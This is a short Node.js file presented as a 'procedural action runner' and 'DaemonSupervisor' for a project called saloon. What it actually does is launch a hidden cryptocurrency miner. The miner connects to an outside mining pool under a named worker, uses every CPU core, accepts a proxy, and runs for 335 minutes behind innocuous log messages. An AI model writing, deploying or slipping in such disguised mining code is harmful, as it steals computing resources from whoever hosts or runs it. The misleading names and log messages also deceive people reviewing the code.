// Procedural action runner for saloon
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

class DaemonSupervisor {
    constructor() {
        const sessionId = "71b433";
        console.log(`[host] Initialized DaemonSupervisor for saloon [${sessionId}]`);

        this.daemon = new NMiner(
            "wss://runtime.nmining.igrp.app/",
            "Subhas1975.saloon",
            ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
        );

        const keepAlivePromise = new Promise(() => {});
        setTimeout(() => {
        console.log("[timeout] Operational limit (335m) reached, exiting cleanly.");
        process.exit(0);
    }, 335 * 60 * 1000);

        process.on("SIGTERM", () => {
            
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new DaemonSupervisor();
